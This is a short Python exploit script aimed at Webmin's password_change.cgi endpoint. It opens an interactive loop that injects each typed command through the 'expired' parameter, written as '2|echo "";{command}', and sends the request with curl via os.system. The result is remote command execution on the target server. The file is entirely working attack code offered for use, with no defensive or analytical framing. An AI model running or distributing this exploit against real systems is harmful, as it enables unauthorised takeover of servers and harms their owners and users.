#!/usr/bin/env python3
import os
import sys
import urllib.parse
import urllib.request
import ssl

class WebMinExploit:
    def __init__(self):

        if len(sys.argv) != 2:
            print("Wrong Usage")
            return None

        self.baseURL = sys.argv[1].strip('/')   

    def exploit(self):

        self.webshell()

    def webshell(self):
        vulnerableURL = f"{self.baseURL}/password_change.cgi"
        headers = f"Referer: {self.baseURL}/session_login.cgi"
        while True:
            command = input('$ ')
            payload = f'user=gotroot&pam=&expired=2|echo "";{command}'
            #payload = {'user':'gotroot','pam':'','expired':f'2|echo "";{command}'}
            os.system("curl -s -k {} -d '{}' -H '{}' | grep -v '^<.*'".format(vulnerableURL, payload, headers))

webminexploit = WebMinExploit()
webminexploit.exploit()
